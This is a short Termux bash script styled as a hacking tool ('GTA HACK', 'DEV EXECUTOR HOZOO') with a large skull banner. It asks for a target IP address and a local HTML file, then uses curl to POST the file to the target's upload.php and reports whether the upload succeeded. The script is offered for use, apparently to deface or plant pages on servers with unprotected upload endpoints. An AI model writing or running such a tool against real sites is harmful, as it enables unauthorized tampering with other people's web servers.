#!/data/data/com.termux/files/usr/bin/bash
#author :hozoo
#diliris : 2025-03-15 sabtu

clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'




echo -e "
\033[34;1m=====================================================================================================

\033[31;1m
                                      ⣀⣠⣤⡶⠶                ⠲⠶⣤⣤⣄⣀       
                                  ⢀⣠⣶⣿⣿⠟⠉                     ⠙⠻⡿⣿⣦⣄    
                                 ⣰⣿⣿⢏⡔⠁                         ⠘⢎⠻⣿⣷⡄  
                                ⣰⣿⣻⠃⡞                            ⠈⡇⢹⣿⣿⡄ 
                               ⢰⣿⣟⡗ ⡇                             ⣿⠐⣛⣿⣿ 
                               ⢸⣿⣿⡓ ⢳⡀        ⣀⣀     ⠠⢄⣀⡀        ⣰⠇⠐⣻⣿⣿⡆
                                ⢸⣿⣿⡷⠖⠋⠻⣄  ⣀⣤⠶⠚⠉⠁         ⠈⠙⠲⢦⣄⡀ ⢀⣴⠏⠈⠲⢿⣿⣿⠇
                                ⠸⣿⣿⣿⣧⠞⠁⠈⠻⢾⣏                  ⠈⣻⡷⠋⡁⠈⢦⣾⣿⣿⣿ 
                                 ⠹⣿⣿⣷⣷⡴⠃  ⡿                  ⣧  ⠱⣴⣷⣯⣿⡿⠃ 
                                  ⠙⢿⣿⣯⣾⣿⢗⣼⠃                   ⠹⣦⢾⣿⣮⣿⣿⠟⠁  
                                   ⣽⣿⣿⡿⠟⠁                     ⠘⠳⣽⣿⣿⡍    
                                   ⢀⣿ ⣀                          ⢀⡠⢸⣇    
                                   ⢸⡇ ⠘⣄                         ⡜  ⣿    
                                  ⠘⣇ ⢄⣿⡰⡄                     ⡴⢸⣇ ⢀⡟    
                                  ⣿ ⣾⣿⠇⠹⣶⣤⣀⣀ ⠙⢶⣤⡀   ⣠⣴⠖⠉⢀⣀⣠⣴⡾⠁⢿⣿⡆⢸⡇    
                                   ⢸⣿⠏⢠⣾⣿⣿⣿⣿⣿⣦⡀⠹⡿  ⠸⡿⠁⣤⣾⣿⣿⣿⣿⣷⣦ ⢿⡇⡸     
                                   ⢧⢿⡀⢸⣿⣿⣿⣿⣿⣿⣿⡟⠆     ⠞⣿⣿⣿⣿⣿⣿⣿⣿ ⣸⢧⠇     
                                   ⠈⢈⡷⠈⢿⣿7⣿⣿⣿⣿⣿⡇  ⣠⣤⡀  ⣿⣿⣿⣿⣿⣿⣿⠃ ⣏⠈      
                                   ⢀⡆   ⠙⠻⠿⠿⠿⠟⠁ ⢠⣿⣿⣧  ⠙⠿⠿⠿⠿⠛⠁   ⣆      
                                    ⢸⡄          ⢀⣾⣿⢻⣿⣆           ⣸      
                                    ⠘⢷⣄⡀        ⢾⣿⡿⢸⣿⣿⠆        ⣀⣴⡟      
                                    ⠈⠙⠛⢛⣿⣿⣿⡖⠦⡀  ⠉⠁ ⠉⠁  ⢠⠖⣾⣿⣿⣿⠛⠛⠉       
                                        ⠘⡇⣿⢻⣿⣴⣠⢀ ⡄ ⡀⢀⡄⢀⣀⣼⣼⣿⠹⡇⡟          
                                       ⡀⠧⡇⢸⣿⣿⡇⢹⠒⡟⠙⡟⠉⡗⢹⠁⣿⣿⣿ ⡧⠇⡀         
                                        ⢱  ⠘⢿⣹⠛⠼⣦⣿⣄⣧⣀⣷⣾⠴⢻⣸⠟  ⢠⡇         
                                       ⠘⢧⡀  ⠊⠳⠧⣼⣠⣤⣧⣱⣸⡦⠷⠚⠃  ⣠⠟          
                                          ⠈⠲⣤⡀   ⠈  ⠈    ⣠⡴⠋⠁                           
                                           ⠙⢿⣦        ⢀⣾⡟⠁                
                                            ⠈⠻⢷⣄⣠⣴⣶⣤⣄⣰⠿⠋                                 
  waktu=$(date +"%H:%M:%S")⠀               
  tanggal=$(date +"%A, %d %B %Y")     
\033[34;1m=====================================================================================================


 \033[32;1m        [GTA HACK ] [DEV EXECUTOR HOZOO ]     [DILIRIS :2025-03-15]       [ONLINE]

\033[34;1m=====================================================================================================
              "


read -p "Enter the IP address: " IP_ADDRESS
read -p "Enter the path to the HTML file: " HTML_FILE


if [ ! -f "$HTML_FILE" ]; then
  echo "HTML file not found!"
  exit 1
fi



TARGET_URL="http://$IP_ADDRESS/upload.php"

response=$(curl -s -o /dev/null -w "%{http_code}" -X POST -F "file=@$HTML_FILE" "$TARGET_URL" --connect-timeout 10)



if [ "$response" -eq 200 ]; then
  echo "File uploaded successfully!"
else
  echo "Failed to upload file. HTTP response code: $response"


fi
